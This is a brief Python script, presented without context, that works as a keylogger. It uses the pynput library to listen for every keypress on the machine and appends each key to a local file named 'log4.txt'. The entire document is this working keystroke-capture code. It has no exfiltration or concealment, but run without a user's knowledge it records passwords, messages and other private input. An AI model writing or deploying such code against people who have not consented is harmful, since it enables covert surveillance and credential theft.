from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    with open("log4.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()
